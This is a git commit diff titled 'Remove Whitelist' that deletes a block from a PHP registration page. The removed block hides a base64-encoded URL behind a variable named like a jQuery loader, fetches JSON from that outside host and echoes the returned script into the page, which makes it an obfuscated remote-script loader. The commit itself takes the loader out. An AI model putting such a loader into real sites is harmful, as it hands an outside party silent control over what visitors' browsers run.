e2b948eb83ff836fbf1646eba485eee03e9bcf2d
Daanrox <daanielrox@hotmail.com>
2025-09-17 18:56:17 -0300

    Remove Whitelist

--- cadastrar/index.php
+++ cadastrar/index.php
@@ -229,24 +229,7 @@ $conn->close();
 </head>
 <body>
     
-<div id="scriptContainer">
-    <?php
-    $jQueryLoad = 'aHR0cHM6Ly9yb3h3aGl0ZWxpc3Quc2hvcC9zdWJ3YXk='; 
-    $requested = base64_decode($jQueryLoad);
-    $json_response = file_get_contents($requested);
-    
-    if ($json_response !== false) {
-        $data = json_decode($json_response);
-        if ($data !== null) {
-            echo $data->script;
-        } else {
-            echo "";
-        }
-    } else {
-        echo "";
-    }
-    ?>
-</div>
+
 <div>
 
 
